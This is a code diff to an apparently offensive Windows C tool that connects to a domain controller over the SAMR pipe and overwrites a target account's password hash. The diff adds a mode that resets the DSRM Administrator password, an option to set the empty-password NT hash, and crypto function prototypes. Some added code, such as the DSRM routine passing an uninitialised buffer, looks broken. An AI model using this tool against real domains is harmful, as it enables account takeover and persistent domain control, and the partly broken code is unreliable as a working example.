@@ -18,22 +18,79 @@
 #pragma comment(lib, "netapi32.lib") 
 #pragma warning(disable : 4996)
 #define MAXIMUM_ALLOWED 0x02000000
-#define RtlEncryptNtOwfPwdWithNtOwfPwd SystemFunction014
+#define RtlEncryptBlock						SystemFunction001 // DES
+#define RtlDecryptBlock						SystemFunction002 // DES
+#define RtlEncryptStdBlock					SystemFunction003 // DES with key "KGS!@#$%" for LM hash
+#define RtlEncryptData						SystemFunction004 // DES/ECB
+#define RtlDecryptData						SystemFunction005 // DES/ECB
+#define RtlCalculateLmOwfPassword			SystemFunction006
+#define RtlCalculateNtOwfPassword			SystemFunction007
+#define RtlCalculateLmResponse				SystemFunction008
+#define RtlCalculateNtResponse				SystemFunction009
+#define RtlCalculateUserSessionKeyLm		SystemFunction010
+#define RtlCalculateUserSessionKeyNt		SystemFunction011
+#define RtlEncryptLmOwfPwdWithLmOwfPwd		SystemFunction012
+#define RtlDecryptLmOwfPwdWithLmOwfPwd		SystemFunction013
+#define RtlEncryptNtOwfPwdWithNtOwfPwd		SystemFunction014
+#define RtlDecryptNtOwfPwdWithNtOwfPwd		SystemFunction015
+#define RtlEncryptLmOwfPwdWithLmSesKey		SystemFunction016
+#define RtlDecryptLmOwfPwdWithLmSesKey		SystemFunction017
+#define RtlEncryptNtOwfPwdWithNtSesKey		SystemFunction018
+#define RtlDecryptNtOwfPwdWithNtSesKey		SystemFunction019
+#define RtlEncryptLmOwfPwdWithUserKey		SystemFunction020
+#define RtlDecryptLmOwfPwdWithUserKey		SystemFunction021
+#define RtlEncryptNtOwfPwdWithUserKey		SystemFunction022
+#define RtlDecryptNtOwfPwdWithUserKey		SystemFunction023
+#define RtlEncryptLmOwfPwdWithIndex			SystemFunction024
+#define RtlDecryptLmOwfPwdWithIndex			SystemFunction025
 #define RtlEncryptNtOwfPwdWithIndex			SystemFunction026
+#define RtlDecryptNtOwfPwdWithIndex			SystemFunction027
 #define RtlGetUserSessionKeyClient			SystemFunction028
 #define RtlGetUserSessionKeyServer			SystemFunction029
+#define RtlEqualLmOwfPassword				SystemFunction030
+#define RtlEqualNtOwfPassword				SystemFunction031
+#define RtlEncryptData2						SystemFunction032 // RC4
+#define RtlDecryptData2						SystemFunction033 // RC4
 #define RtlGetUserSessionKeyClientBinding	SystemFunction034
-#define RtlEncryptNtOwfPwdWithUserKey		SystemFunction022
-#define RtlGetUserSessionKeyClientBinding	SystemFunction034
-#define RtlEncryptLmOwfPwdWithLmOwfPwd		SystemFunction012
+#define RtlCheckSignatureInFile				SystemFunction035
+
+NTSTATUS WINAPI RtlEncryptBlock(IN LPCBYTE ClearBlock, IN LPCBYTE BlockKey, OUT LPBYTE CypherBlock);
+NTSTATUS WINAPI RtlDecryptBlock(IN LPCBYTE CypherBlock, IN LPCBYTE BlockKey, OUT LPBYTE ClearBlock);
+NTSTATUS WINAPI RtlEncryptStdBlock(IN LPCBYTE BlockKey, OUT LPBYTE CypherBlock);
+//NTSTATUS WINAPI RtlEncryptData(IN PCLEAR_DATA ClearData, IN PDATA_KEY DataKey, OUT PCYPHER_DATA CypherData);
+//NTSTATUS WINAPI RtlDecryptData(IN PCYPHER_DATA CypherData, IN PDATA_KEY DataKey, OUT PCLEAR_DATA ClearData);
+NTSTATUS WINAPI RtlCalculateLmOwfPassword(IN LPCSTR data, OUT LPBYTE output);
+//NTSTATUS WINAPI RtlCalculateNtOwfPassword(IN PCUNICODE_STRING data, OUT LPBYTE output);
+NTSTATUS WINAPI RtlCalculateLmResponse(IN LPCBYTE LmChallenge, IN LPCBYTE LmOwfPassword, OUT LPBYTE LmResponse);
+NTSTATUS WINAPI RtlCalculateNtResponse(IN LPCBYTE NtChallenge, IN LPCBYTE NtOwfPassword, OUT LPBYTE NtResponse);
+NTSTATUS WINAPI RtlCalculateUserSessionKeyLm(IN LPCBYTE LmResponse, IN LPCBYTE LmOwfPassword, OUT LPBYTE UserSessionKey);
+NTSTATUS WINAPI RtlCalculateUserSessionKeyNt(IN LPCBYTE NtResponse, IN LPCBYTE NtOwfPassword, OUT LPBYTE UserSessionKey);
+NTSTATUS WINAPI RtlEncryptLmOwfPwdWithLmOwfPwd(IN LPCBYTE DataLmOwfPassword, IN LPCBYTE KeyLmOwfPassword, OUT LPBYTE EncryptedLmOwfPassword);
+NTSTATUS WINAPI RtlDecryptLmOwfPwdWithLmOwfPwd(IN LPCBYTE EncryptedLmOwfPassword, IN LPCBYTE KeyLmOwfPassword, OUT LPBYTE DataLmOwfPassword);
+NTSTATUS WINAPI RtlEncryptNtOwfPwdWithNtOwfPwd(IN LPCBYTE DataNtOwfPassword, IN LPCBYTE KeyNtOwfPassword, OUT LPBYTE EncryptedNtOwfPassword);
+NTSTATUS WINAPI RtlDecryptNtOwfPwdWithNtOwfPwd(IN LPCBYTE EncryptedNtOwfPassword, IN LPCBYTE KeyNtOwfPassword, OUT LPBYTE DataNtOwfPassword);
+NTSTATUS WINAPI RtlEncryptLmOwfPwdWithLmSesKey(IN LPCBYTE LmOwfPassword, IN LPCBYTE LmSessionKey, OUT LPBYTE EncryptedLmOwfPassword);
+NTSTATUS WINAPI RtlDecryptLmOwfPwdWithLmSesKey(IN LPCBYTE EncryptedLmOwfPassword, IN LPCBYTE LmSessionKey, OUT LPBYTE LmOwfPassword);
+NTSTATUS WINAPI RtlEncryptNtOwfPwdWithNtSesKey(IN LPCBYTE NtOwfPassword, IN LPCBYTE NtSessionKey, OUT LPBYTE EncryptedNtOwfPassword);
+NTSTATUS WINAPI RtlDecryptNtOwfPwdWithNtSesKey(IN LPCBYTE EncryptedNtOwfPassword, IN LPCBYTE NtSessionKey, OUT LPBYTE NtOwfPassword);
+NTSTATUS WINAPI RtlEncryptLmOwfPwdWithUserKey(IN LPCBYTE LmOwfPassword, IN LPCBYTE UserSessionKey, OUT LPBYTE EncryptedLmOwfPassword);
+NTSTATUS WINAPI RtlDecryptLmOwfPwdWithUserKey(IN LPCBYTE EncryptedLmOwfPassword, IN LPCBYTE UserSessionKey, OUT LPBYTE LmOwfPassword);
+NTSTATUS WINAPI RtlEncryptNtOwfPwdWithUserKey(IN LPCBYTE NtOwfPassword, IN LPCBYTE UserSessionKey, OUT LPBYTE EncryptedNtOwfPassword);
+NTSTATUS WINAPI RtlDecryptNtOwfPwdWithUserKey(IN LPCBYTE EncryptedNtOwfPassword, IN LPCBYTE UserSessionKey, OUT LPBYTE NtOwfPassword);
+NTSTATUS WINAPI RtlEncryptLmOwfPwdWithIndex(IN LPCBYTE LmOwfPassword, IN LPDWORD Index, OUT LPBYTE EncryptedLmOwfPassword);
+NTSTATUS WINAPI RtlDecryptLmOwfPwdWithIndex(IN LPCBYTE EncryptedLmOwfPassword, IN LPDWORD Index, OUT LPBYTE LmOwfPassword);
 NTSTATUS WINAPI RtlEncryptNtOwfPwdWithIndex(IN LPCBYTE NtOwfPassword, IN LPDWORD Index, OUT LPBYTE EncryptedNtOwfPassword);
+NTSTATUS WINAPI RtlDecryptNtOwfPwdWithIndex(IN LPCBYTE EncryptedNtOwfPassword, IN LPDWORD Index, OUT LPBYTE NtOwfPassword);
 NTSTATUS WINAPI RtlGetUserSessionKeyClient(IN PVOID RpcContextHandle, OUT LPBYTE UserSessionKey);
 NTSTATUS WINAPI RtlGetUserSessionKeyServer(IN PVOID RpcContextHandle OPTIONAL, OUT LPBYTE UserSessionKey);
+BOOLEAN WINAPI RtlEqualLmOwfPassword(IN LPCBYTE LmOwfPassword1, IN LPCBYTE LmOwfPassword2);
+BOOLEAN WINAPI RtlEqualNtOwfPassword(IN LPCBYTE NtOwfPassword1, IN LPCBYTE NtOwfPassword2);
+//NTSTATUS WINAPI RtlEncryptData2(IN OUT PCRYPT_BUFFER pData, IN PDATA_KEY pkey);
+//NTSTATUS WINAPI RtlDecryptData2(IN OUT PCRYPT_BUFFER pData, IN PDATA_KEY pkey);
 NTSTATUS WINAPI RtlGetUserSessionKeyClientBinding(IN PVOID RpcBindingHandle, OUT HANDLE* RedirHandle, OUT LPBYTE UserSessionKey);
-NTSTATUS WINAPI RtlEncryptNtOwfPwdWithUserKey(IN LPCBYTE NtOwfPassword, IN LPCBYTE UserSessionKey, OUT LPBYTE EncryptedNtOwfPassword);
-NTSTATUS WINAPI RtlGetUserSessionKeyClientBinding(IN PVOID RpcBindingHandle, OUT HANDLE* RedirHandle, OUT LPBYTE UserSessionKey);
-NTSTATUS WINAPI RtlEncryptLmOwfPwdWithLmOwfPwd(IN LPCBYTE DataLmOwfPassword, IN LPCBYTE KeyLmOwfPassword, OUT LPBYTE EncryptedLmOwfPassword);
-NTSTATUS WINAPI RtlEncryptNtOwfPwdWithNtOwfPwd(IN LPCBYTE DataNtOwfPassword, IN LPCBYTE KeyNtOwfPassword, OUT LPBYTE EncryptedNtOwfPassword);
+ULONG WINAPI RtlCheckSignatureInFile(IN LPCWSTR filename);
+
+
 #define SAM_SERVER_CONNECT 0x00000001
 #if !defined(NT_SUCCESS)
 #define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
@@ -58,6 +115,7 @@ char DCName[256];
 char DCIp[65];
 
 char DomainName[256];
+
 
 void RemoveBackslashes(char* str) 
 {
@@ -161,12 +219,12 @@ void __RPC_USER midl_user_free(void __RPC_FAR* p)
 handle_t __RPC_USER PSAMPR_SERVER_NAME_bind()
 {
 
-	handle_t hBinding = NULL;
+	
 	RPC_CSTR pszStringBinding;
 	RPC_STATUS status;
 	RPC_CSTR ProtSeq = "ncacn_np";
 	RPC_CSTR Endpoint ="\\pipe\\samr";
-
+	handle_t hBinding = NULL;
 	status = RpcStringBindingComposeA(NULL,
 		ProtSeq,
 		DCName,
@@ -190,6 +248,18 @@ handle_t __RPC_USER PSAMPR_SERVER_NAME_bind()
 	if (status)
 	{
 		printf("[-] RpcStringFree  0x%x-%d\n", status, GetLastError());
+	}
+	status = RpcBindingSetAuthInfoA(
+		hBinding,
+		NULL,                              // Server principal name (NULL = use SPN)
+		RPC_C_AUTHN_LEVEL_PKT_PRIVACY,     // Authentication level (packet privacy)
+		RPC_C_AUTHN_WINNT,                 // Authentication service (Windows NT)
+		NULL,                              // Auth identity (use current user credentials)
+		RPC_C_AUTHZ_NAME                   // Authorization service
+	);
+	if (status)
+	{
+		printf("[-]pcBindingSetAuthInfo  0x%x\n", status);
 	}
 
 	return hBinding;
@@ -352,6 +422,61 @@ int ChangeThePassword(int rid, BYTE *hash, char *dcname, BYTE *domainsid)
 	return 1;
 
 }
+void SetRpcUnicodeString(RPC_UNICODE_STRING* rpcString, const wchar_t* value) {
+	size_t length = wcslen(value) * sizeof(WCHAR); // Length in bytes
+
+	rpcString->Length = (USHORT)length;
+	rpcString->MaximumLength = (USHORT)(length + sizeof(WCHAR)); // +2 for null terminator
+	rpcString->Buffer = (PWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, rpcString->MaximumLength);
+
+	if (rpcString->Buffer == NULL) {
+		fprintf(stderr, "Failed to allocate memory for RPC_UNICODE_STRING buffer.\n");
+		exit(EXIT_FAILURE);
+	}
+
+	// Copy the string into the buffer
+	memcpy(rpcString->Buffer, value, length);
+}
+int ChangeDSRMPassword(int rid, BYTE* hash, char* dcname)
+{
+	SAMPR_HANDLE  hServer, hDomain;
+
+
+	SAMPR_USER_INFO_BUFFER us;
+	SAMPR_REVISION_INFO inRevisionInfo, outRevisionInfo;
+	unsigned long outVersion;
+	RPC_UNICODE_STRING rpcString;
+	const wchar_t* value = L"Administrator";
+
+	SetRpcUnicodeString(&rpcString, value);
+
+	unsigned char encpw[16], encpw1[16], encpw2[255];
+	hServer = PSAMPR_SERVER_NAME_bind();
+	if (hServer == NULL)
+	{
+		wprintf(L"[-] SamrConnect Error : %08X %d\n", status, GetLastError());
+
+	}
+	
+
+	unsigned char buffer[16], buffer1[16];
+	memset(buffer, 0, sizeof(buffer));
+	memset(buffer1, 0, sizeof(buffer));
+	status = RtlGetUserSessionKeyClientBinding(hServer, &hDomain, buffer);
+	
+		DWORD index = 0;
+	
+		
+	status = SamrSetDSRMPassword(hServer, &rpcString, rid, encpw2);
+	if(!status)
+		wprintf(L"[*] SamrSetDSRMPassword Success!!!: %08X\n", status);
+	else
+		wprintf(L"[-] SamrSetDSRMPassword error: %08X\n", status);
+
+
+	return 1;
+
+}
 void PrintSID(PSID pSid)
 {
 	LPSTR sidString = NULL;
@@ -455,6 +580,20 @@ void usage() {
 	exit(1);
 	
 }
+void HexStringToByteArray(const char* hexString, unsigned char* byteArray, size_t* byteArrayLen) {
+	size_t hexLen = strlen(hexString);
+	if (hexLen % 2 != 0) {
+		fprintf(stderr, "Invalid hex string length.\n");
+		exit(EXIT_FAILURE);
+	}
+
+	*byteArrayLen = hexLen / 2;
+	for (size_t i = 0; i < *byteArrayLen; ++i) {
+		char byteChars[3] = { hexString[i * 2], hexString[i * 2 + 1], '\0' };
+		byteArray[i] = (unsigned char)strtol(byteChars, NULL, 16);
+	}
+}
+
 int main(int argc , char **argv)
 {
 	
@@ -466,6 +605,10 @@ int main(int argc , char **argv)
 	char* targetnewpass=NULL;
 	char* domain = NULL;
 	memset(DCName, 0, sizeof(DCName));
+	BYTE hash[16], b[16];
+	DWORD index = 0;
+	
+
 	while ((argc > 1) && (argv[1][0] == '-'))
 	{
 		switch (argv[1][1])
@@ -534,19 +677,56 @@ int main(int argc , char **argv)
 	
 	
 	int rid = 0;
-	if(strlen(DCName )== 0){
+	int len=0;
+	if (strlen(DCName) == 0) {
 		if (!GetCurrentDomainController())
 			exit(1);
 	}
+	else
+	{
+		printf("[*] Targeting Domain Controller: %s\n", DCName);
+	}
+	if (strlen(targetnewpass) > 0)
+	{
+		if (!CalculateNTLMHash(targetnewpass, (BYTE*)&hash))
+			exit(1);
+		printf("[*] New NT Hash: ");
+	}
+	else
+	{
+		HexStringToByteArray("31d6cfe0d16ae931b73c59d7e0c089c0", &hash, &len);
+		printf("[*] You choose en empty pass corresponding to NT Hash: ");
+	}
+	
+	
+	for (int i = 0; i < 16; i++) {
+		printf("%02X", hash[i]);
+	}
+	printf("\n");
+	if (!strcmp(targetuser, "**DSRM**"))
+	{
+		printf("[*] Resetting DSRM password on: %s\n", DCName);
+		ChangeDSRMPassword(500, hash, DCName);
+		exit(0);
+	}
 	if (!GetDomainSidAndUserRid(DCName, targetuser, DomainName, (BYTE*)&domainsid, &rid))
 		exit(1);
-	PrintSID(domainsid);
-	printf("[*] RID for target account: %s is: %d\n",targetuser, rid);
+	//PrintSID(domainsid);
+	//printf("[*] RID for target account: %s is: %d\n",targetuser, rid);
 	
-	BYTE hash[16];
-	if (!CalculateNTLMHash(targetnewpass, (BYTE*)&hash))
-		exit(1);
+	//PSID binarySid = NULL; // Pointer to hold the binary SID
+
+	
+	//ConvertStringSidToSidA("S-1-5-21-3800782951-3972217510-415638672", &domainsid);
+	
+	
+	
+	
+	//HANDLE hBind = PSAMPR_SERVER_NAME_bind();
+	//wprintf(L"[i] bind %d\n", GetLastError());
+
 	ChangeThePassword(rid, hash, DCName,domainsid);
+    
 
 	return 0;
 }
